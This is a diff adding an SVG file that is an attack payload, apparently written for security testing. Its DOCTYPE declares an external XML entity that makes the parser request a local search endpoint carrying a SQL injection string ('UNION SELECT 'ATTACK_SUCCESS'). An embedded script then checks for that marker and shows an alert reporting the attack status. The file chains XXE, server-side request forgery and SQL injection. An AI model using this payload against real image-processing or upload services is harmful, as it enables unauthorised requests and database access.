@@ -1,0 +1,19 @@
+<?xml version="1.0"?>
+<!DOCTYPE svg [
+<!ENTITY % remote SYSTEM "http://localhost:8001/search?q=%27%20UNION%20SELECT%20'ATTACK_SUCCESS',1--">
+%remote;
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="300" height="100">
+  <rect width="100%" height="100%" fill="#ffebee"/>
+  <text x="20" y="30" font-size="12">
+    Status: <?xml-stylesheet type="text/xml" href="&remote;"?>
+  </text>
+  <script>
+    // Fallback detection
+    setTimeout(() => {
+      const status = document.querySelector('text').textContent.includes('ATTACK_SUCCESS') 
+        ? 'Success!' : 'No response detected';
+      alert(`Attack Status: ${status}`);
+    }, 2000);
+  </script>
+</svg>
